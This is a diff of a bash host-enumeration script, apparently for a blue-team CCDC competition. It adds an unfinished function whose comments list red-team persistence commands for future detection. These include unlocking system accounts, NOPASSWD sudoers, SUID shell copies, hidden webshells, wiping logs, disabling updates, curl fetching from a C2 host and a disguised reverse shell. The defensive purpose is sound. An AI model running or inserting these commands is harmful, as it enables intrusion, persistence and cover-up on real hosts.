@@ -1,11 +1,4 @@
 #!/bin/bash
-################################################################################
-# Written by: K7-Avenger				 		       #
-# For: Metro State CCDC 2023						       #
-# Purpose: To investigate Linux hosts for potential weaknesses & IoC's, giving #
-# users a better understanding of the host landscape, and prioritized list of  #
-# manual enumeration items.						       #
-################################################################################
 
 # This section is used to define colors used to improve readability of output
 RED='\033[0;31m'
@@ -167,6 +160,86 @@ enumConfigs(){
   echo -e "${RESET}"
 }
 
+enumTeamRocket(){
+  echo "*****************************"
+  echo "** Known Red-team activity **"
+  echo "*****************************"
+# Checks for the following should be implemented
+
+  # Non-standard ssh keys
+    # /root/.ssh/authorized
+    # /root/.ssh/authorized_keys*
+    # /dev/.ssh/
+    # /etc/ssh/sshd_config
+
+  # Permitting root ssh login
+    # sed -i 's/^PermitRootLogin .$/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+  # Use of chattr (chatter -i) to make dirs/files sticky
+    # chatter -i /root/.ssh/authroized_keys*
+    # chatter -i "/etc/ssh/sshd_config"
+
+  # Modifying crontab
+    # echo "*/5 * * * * /sbin/iptables -F" | crontab -
+
+
+  # enabling logins on 'bin' or other system accounts (modified /etc/shadow)
+    #sed -i -e 's/bin:\*:/bin:$6$* /etc/shadow
+
+  # modifying user permissions
+    # usermod -s /bin/sh bin
+
+  # /etc/sudoers - gloabal sudoers 'ALL ALL=(ALL:ALL) NOPASSWD:ALL'
+  
+
+  # web-backdoors "usermod -G admin -a bin" same for www-data, httpd & apache
+  # Apparently, Ubuntu automatically gives users of the 'admin' group sudo rights.
+    # usermod -G admin -a bin
+
+  # hidden copies of '/bin/bash'
+    # /dev/... ; chmod +s /dev/.../pwnd
+
+  #hidden backdoor webshells
+    #/var/www/.src.php ; /var/www/html/.src.php
+
+  #disabling updates
+    #echo 'exclude=*' >> /etc/yum.conf
+    #echo -e "Pachage: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
+    #echo -e "Pachage: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
+    #sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
+
+  #stopping critical services
+    #service httpd stop; postfix; sendmail; mysql; webmin; named; bind; 
+    #killall -9 webmin.pl; apache2; httpd; named; mysqld_safe; mysql; qemu-kvm
+
+  #granting executable permissions
+    #chmod +x /usr/share/services.sh  
+
+  #granting SUID permsions on /bin/
+
+  # deleting logs
+    # cat /dev/null > /var/log/wtmp
+    # cat /dev/null > /var/log/btmp
+  
+  # Grabbing files from C2
+    #curl http://$C2_IP/$1 -s --create-dirs -o "/etc/udev/conf.d/
+
+  # Webservers/reverse shells disquised as kernel process [kworker]
+    #setsid ./$binname -i eth0 -s 1 -b 5555 $C2_IP -d -x
+  # use of nc
+
+  # deletion or moving of binaries (chattr & kill)
+    # mv $(which chattr) /usr/bin/diff2
+
+  # give every user a cronjob
+    # for user in $(awk -f: '$3 > 500 {print $1}' /etc/passwd); do
+
+  # allow every user to run bash as root
+    # for user in $(awk -f: '$3 > 500 {print $1}' /etc/passwd); do
+      #echo "'/etc/udev/conf.d/    /default' $C2_IP $C2_PORT >> $home/.bashrc 
+      # >> /dev/.bashrc ; /etc/profile ; /etc/bash.bashrc
+}
+
 enumCronServices(){
   echo "*************"
   echo "** Crontab **"
@@ -252,4 +325,4 @@ while getopts 'ufcksl :' OPTION; do
 	esac
 done
 
-# enumLogs & enumConfigs still not finished ~DW
+# enumLogs enumHistory, enumTeamRocket & enumConfigs still not finished ~DW
